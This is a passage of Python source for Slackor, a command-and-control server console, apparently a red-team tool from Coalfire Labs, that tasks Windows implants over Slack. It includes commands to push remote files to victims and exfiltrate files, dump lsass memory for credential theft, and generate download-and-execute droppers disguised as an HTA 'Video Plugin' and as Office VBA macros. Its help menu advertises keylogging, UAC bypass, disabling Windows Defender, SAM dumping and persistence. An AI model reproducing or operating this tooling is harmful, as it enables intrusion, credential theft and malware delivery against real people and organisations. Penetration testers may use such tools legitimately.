            print(color("Changed beacon timing to " + args + " seconds", "blue"))
        except ValueError:
            print(color("Beacon value must be an integer.  (Number of seconds)", "yellow"))

    def do_wget(self, args):
        """WGET - Not actually wget, but will download a file when given a URL.
             Example: wget hxxps://domain.tld/file.exe """
        print(color("RISK: Writes to disk, calls out to non-Slack domain", "yellow"))
        if bad_opsec():
            if validate_url(args):
                upload(bearer, commands, self.target, args)
                print(color("Tasked " + self.target + " to download the file at " + args, "blue"))
            else:
                print("Invalid URL.  Please use a full URL.")

    def do_upload(self, args):
        """UPLOAD - Will upload a file that will be downloaded on the agent.  Provide a local path on the server.
             Example: upload /tmp/file.exe"""
        print(color("RISK: Writes to disk", "yellow"))
        if bad_opsec():
            url = upload_file(args)
            if url:
                upload(bearer, commands, self.target, url)
                print(color("Tasked " + self.target + " to download the file at " + url, "blue"))

    def do_download(self, args):
        """DOWNLOAD - Will retrieve a file from the agent.  Provide a local path on the agent.
             Example: download C:\\Users\\Administrator\\Desktop\\secrets.txt """
        download(bearer, commands, self.target, args)
        print(color("Downloading " + args + " from " + self.target + "...", "blue"))

    def do_minidump(self, args):
        """MINIDUMP - Dumps memory from lsass.exe and downloads it"""
        conn = sqlite3.connect('slackor.db')
        cursor = conn.execute("SELECT user from AGENTS where id='" + self.target + "'")
        user = cursor.fetchone()
        if user[0].endswith('*'):
            print(color("RISK: Writes to disk, executes cmd.exe", "yellow"))
            if bad_opsec():
                minidump(bearer, commands, self.target)
                print(color("Dumping lsass.exe on target, this may take a while...", "blue"))
        else:
            print(color("Agent not running as high integrity", "yellow"))

    def do_back(self, args):
        """BACK - Leave the agent prompt and return to the main menu"""
        return True

    def do_kill(self, args):
        """KILL - Kills the agent"""
        kill(bearer, commands, self.target)
        print(color("Sent kill command to " + self.target, "blue"))
        conn = sqlite3.connect('slackor.db')
        conn.execute("DELETE FROM AGENTS WHERE id=?", (self.target,))
        conn.commit()
        conn.close()
        agent_list.remove(self.target)
        return True

    def default(self, args):
        if len(args) >= 3970:
            print("Command too large.  It must be less than 3970 characters after encrypting.")
        else:
            send_command(bearer, args, commands, self.target)


class MyPrompt(Cmd):  # Class for modules ran from the main menu

    def do_interact(self, args):
        """Interacts with a registered agent \n Usage: interact [agent]"""

        target = args.upper()
        # Check to see if agent is in database
        conn = sqlite3.connect('slackor.db')
        cursor = conn.execute("SELECT id from AGENTS WHERE id=?", (target,))
        result = cursor.fetchone()
        conn.close()
        if result:
            i = AgentCmd()
            i.target = target
            i.prompt = self.prompt[:-1] + ': ' + color(args.upper(), "red") + ')'
            i.cmdloop(color("Interacting with " + target + ":", "blue"))

        else:
            print(color("Agent " + target + " not found", "yellow"))

    def complete_interact(self, text, line, start_index, end_index):
        if text:
            return [
                agent for agent in agent_list
                if agent.startswith(text.upper())
            ]
        else:
            return agent_list

    def complete_remove(self, text, line, start_index, end_index):
        if text:
            return [
                agent for agent in agent_list
                if agent.startswith(text.upper())
            ]
        else:
            return agent_list

    def do_list(self, args):
        """Lists registered agents"""
        t = PrettyTable(['ID', 'Hostname', 'User', 'IP Address', 'Version'])
        t.set_style(PLAIN_COLUMNS)
        conn = sqlite3.connect('slackor.db')
        cursor = conn.execute("SELECT id, hostname, user, ip, version from AGENTS")
        for row in cursor:
            ID = row[0]
            hostname = row[1]
            user = row[2]
            ipaddr = row[3]
            version = row[4]
            t.add_row([ID, hostname, user, ipaddr, version])
        print(color(t, "blue"))
        conn.close()


    def do_remove(self, args):
        """Removes an agent.  Specify an agent ID or say ALL \n Usage: remove [agent]"""
        client = args.upper()
        conn = sqlite3.connect('slackor.db')
        if client == "ALL":
            cursor = conn.execute("SELECT id, hostname, ip, version from AGENTS")
            for row in cursor:
                try:
                    conn.execute("DELETE FROM AGENTS WHERE id=?", (row[0],))
                    kill(bearer, commands, row[0])
                    agent_list.remove(row[0])
                    print(color("Killing " + row[0], "blue"))
                except ValueError:
                    pass
            print(color("Removed all agents", "blue"))
        else:
            try:
                conn.execute("DELETE FROM AGENTS WHERE id=?", (client,))
                kill(bearer, commands, client)
                agent_list.remove(client)
                print(color("Removed ", "blue") + color(client, "red"))
            except ValueError:
                print(color("Agent " + client + " does not exist", "yellow"))

        conn.commit()
        conn.close()

    def do_quit(self, args):
        """Quits the program."""
        print(color("Quitting...", "yellow"))
        raise SystemExit

    def do_wipefiles(self, args):
        """Deletes all files from the workspace."""
        response = input(color("WARNING: This will delete all files out of Slack. Continue? (Y/n): ", "yellow"))
        if response.upper()[:1] == "Y":
            print(color("Deleting all files from Slack...", "yellow"))
            wipe_files()

    def do_stager(self, args):
        """Generates a one-liner to download an execute the implant. Takes a file path as an argument."""
        print(color("RISK: Uploads your implant to a Slack.  This file will be publicly downloadable.", "yellow"))
        if bad_opsec():
            if not args:
                print(color("Please supply the file path to the implant file.", "yellow"))
                return False
            filepath = args
            try:
                open(filepath, 'rb')
                print(color("Uploading payload...", "blue"))
                oneliner, unique = make_stager(filepath)

                if 'sfhta' in globals():

                    with open("output/" + unique + ".html", "w") as out_file:
                        out_file.write(sfhta.obfuscateHta(sfhta.generateBase(oneliner, "Video Plugin")))
                    print(color("Created HTA dropper at output/" + unique + ".html", "blue"))

                if 'sfvba' in globals():

                    with open("output/" + unique + "_word.vba", "w") as out_file:
                        out_file.write(sfvba.generateVBALauncher("word", oneliner, "Comments"))
                    print(color("Created MS Word VBA macro at output/" + unique + "_word.vba", "blue"))

                    with open("output/" + unique + "_excel.vba", "w") as out_file:
                        out_file.write(sfvba.generateVBALauncher("excel", oneliner, "Comments"))
                    print(color("Created MS Excel VBA macro at output/" + unique + "_excel.vba", "blue"))

                    with open("output/" + unique + "_powerpoint.vba", "w") as out_file:
                        out_file.write(sfvba.generateVBALauncher("powerpoint", oneliner, "Comments"))
                    print(color("Created MS PowerPoint VBA macro at output/" + unique + "_powerpoint.vba", "blue"))

            except FileNotFoundError:
                print(color("File not Found", "yellow"))
                return False
            except OSError:
                print(color("File not Found", "yellow"))
                return False

    def emptyline(self):
        pass

    def do_modules(self, arg):
        """Displays information about available modules"""
        print("""Welcome to Slackor!  Below are a list of things you can do:

Main Menu:
===========
help -  Displays information for a command type
           Usage: help [COMMAND]
interact - Interacts with a registered agent
           Usage: interact [AGENT]
list - Lists registered agents
           Usage: list
remove - Removes an agent.  Specify an agent ID or say ALL
           Usage: remove [AGENT]
revive - Sends a signal to all agents to re-register with the server.
           Usage: revive
stager - Generates a one-liner to download an execute the implant.
           Usage: stager [LOCAL FILE PATH]
quit - Quits the program.
           Usage: quit
wipefiles - Deletes all uploaded files out of the Slack workspace
           Usage: wipefiles

Agent Interaction:
===================
back - Leave the agent prompt and return to the main menu
           Usage: back
beacon - Changes the mean(average)time in seconds that an agent checks for new commands.  20% jitter.
           Usage: beacon 5  (Beacons average 5 seconds)
bypassuac - Attempts to spawn a new agent with high integrity.
           Usage: bypassuac [fodhelper|ask]
defanger - Attempts to de-fang Windows Defender.
           Usage: defanger [realtime|exclusion|signature]
cleanup - Removes artifacts.
           Usage: cleanup [registry|scheduler|realtime|exclusion|signature]
clipboard - Retrieves the content of the clipboard
           Usage: clipboard
download - Will retrieve a file from the agent.  Provide a local path on the agent.
           Usage: download [LOCAL FILE PATH]
duplicate - Causes the agent to spawn another invocation of itself
           Usage: duplicate
getsystem - Spawns an agent as NTAUTHORITY/SYSTEM
           Usage: getsystem
help - Displays information for a command type
           Usage: help [COMMAND]
keyscan - Starts a keylogger on the agent
           Usage: keyscan [start|stop|dump]
kill - Kills the current agent
           Usage: kill
minidump - Returns a dump of lsass.exe to be process by mimikatz
           Usage: minidump
persist - Creates persistence by implanting a binary in an Alternate Data Stream.
          Can be activated by a scheduled task or via a run key.  Userland or Elevated.
           Usage: persist [registry|scheduler|wmi]
samdump - Attempts to dump the SAM, SYSTEM and SECURITY files for offline hash extraction
           Usage: samdump
shellcode - Executes x64 raw shellcode from a file.
           Usage: shellcode [SERVER FILE PATH]
sleep - Causes the agent to sleep once.  Time must be in seconds.
           Usage: sleep [INTEGER]
sysinfo - Displays the current user, OS version, system architecture, and number of CPU cores
           Usage: sysinfo
upload - Will upload a file that will be downloaded on the agent.  Provide a local path on the server.
           Usage: upload [SERVER FILE PATH]
wget - Not actually wget, but will download a file when given a URL.
           Usage: wget [URL]

OPSEC Information :
===================
Modules will warn you before performing tasks that write to disk.
When executing shell commands, take note that cmd.exe will be executed.  This may be monitored on the host.
Here are several OPSEC safe commands that will NOT execute cmd.exe:
cat - prints the content of a file
           Usage: cat [FILEPATH]
cd - change directory
           Usage: cd [DIRECTORY]
hostname - Displays the name of the host
           Usage: hostname
ifconfig - Displays interface information
           Usage: ifconfig
getip - Get external IP address (makes a DNS request)
           Usage: getip
ls - list directory contents
           Usage: ls [DIRECTORY]
find - search directory filenames
           Usage: find [GLOB]
mkdir - creates a directory
           Usage: mkdir [DIRPATH]
pwd - prints the current working directory
           Usage: pwd
rm - removes a file
           Usage: rm [FILEPATH]
rmdir - removes a directory
           Usage: rmdir [DIRPATH]
whoami / getuid - prints the current user
           Usage: whoami
           Usage: getuid
""")

    def default(self, line):
        print(color('Unknown command: %s\n' % (line,), "yellow"))

    def do_revive(self, args):
        """REVIVE - Sends a signal to all agents to re-register with the server.
         """
        revive(bearer, commands)
        print(color("Sending signal to all agents to register with the server...\n", "blue"))


if __name__ == '__main__':
    # Keep checking for agents in the background
    agent_monitor = threading.Thread(target=update_agents)
    agent_monitor.start()
    # Keep checking for responses in the background
    response_monitor = threading.Thread(target=check_responses)
    response_monitor.start()
    prompt = MyPrompt()
    prompt.doc_header = "Main Menu (type help <topic>):"
    prompt.misc_header = "Agent Commands (type help <topic>):"
    prompt.prompt = '(Slackor)'
    banner = """
        __ _            _                  _  _
       / _| | __ _  ___| | _____  _ __   _| || |_
       \ \| |/ _` |/ __| |/ / _ \| '__| |_  ..  _|
       _\ | | (_| | (__|   | (_) | |    |_      _|
       \__|_|\__,_|\___|_|\_\___/|_|      |_||_|
\n"""
    note = """
⬡  Presented by n00py on behalf of Coalfire Labs R&D  ⬡
             https://www.coalfire.com/
             """
    prompt.cmdloop(color(banner, "green") + color(note, "red")
    + color("\nType \"modules\""" for additional information.", "green"))
